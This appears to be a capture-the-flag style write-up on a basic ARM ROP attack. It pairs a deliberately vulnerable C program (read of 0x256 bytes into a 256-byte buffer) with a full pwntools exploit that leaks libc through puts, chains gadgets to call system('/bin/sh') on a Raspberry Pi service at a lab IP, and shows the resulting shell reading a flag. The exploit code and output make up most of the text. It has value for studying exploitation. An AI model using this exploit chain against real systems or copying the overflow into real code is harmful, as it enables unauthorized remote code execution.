# Basic ROP example

**Description**

- Simple Buffer Overflow Vulnerabiltiy
- Running on Raspberry Pi 3 ARM Board with daemon
- No Canary, NX-bit on, ASLR on, No PIE, No Relro

**source**

```
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
 
int main(){
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);
    char buf[256];
    printf("Hello, World!\n");
    read(0, buf, 0x256);
    return 0;
}
```

**Exploit code**

```
from pwn import *
import time, sys
 
context.binary = "./vuln"
binary = ELF("./vuln")
p = remote("192.168.0.6", "2323")
prog = log.progress("Remote ARM Exploitation")
'''
0x000105e8: pop {r3, r4, r5, r6, r7, r8, sb, pc};
0x000105d0: mov r0, r7; mov r1, r8; mov r2, sb; blx r3;
0x000104e0: blx r3;
0x105e8 <__libc_csu_init+88> pop    {r3,  r4,  r5,  r6,  r7,  r8,  r9,  pc}
'''
puts = 0x1045c
main_puts = 0x00010554
offset = 0x61478
main = 0x000104f0
got = 0x00020714
 
exp = "A" * 0x100 + p32(got + 260)
exp += p32(0x105e8) + p32(binary.plt["puts"]) + p32(0) * 3
exp += p32(binary.got["puts"]) + p32(0) * 2
exp += p32(0x105d0)
exp += p32(main) + p32(0) * 6 + p32(0x105d0)
 
p.sendline(exp)
p.recvuntil("!\n")
libc_base = u32(p.recv(4)) - offset
system = libc_base + 0x39fac
binsh = libc_base + 0x11db20
log.info("libc_base : " + hex(libc_base))
log.info("system : " + hex(system))
 
exp2 = p32(0x105e8) + p32(system) + p32(0) * 3 + p32(binsh) + p32(0) * 2 + p32(0x105d0)
p.sendline("C" * 0x100 + "B" * 4 + exp2)
 
p.interactive()
```

**result**

```
root@ubuntu:/mnt/hgfs/shared/arm# python simple.py
[*] '/mnt/hgfs/shared/arm/test'
    Arch:     arm-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x10000)
[+] Opening connection to 192.168.0.6 on port 2323: Done
[<] Remote ARM Exploitation
[*] libc_base : 0x76d68000
[*] system : 0x76da1fac
[*] Switching to interactive mode
\x80�vl\x03
Hello, World!
$ id
uid=1000(pi) gid=1000(pi) groups=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),997(gpio),998(i2c),999(spi)
$ cat flag
ARM{y0u_g07_4_s1mple_4rm_3xp10i7at10n}
$
[*] Closed connection to 192.168.0.6 port 2323
```
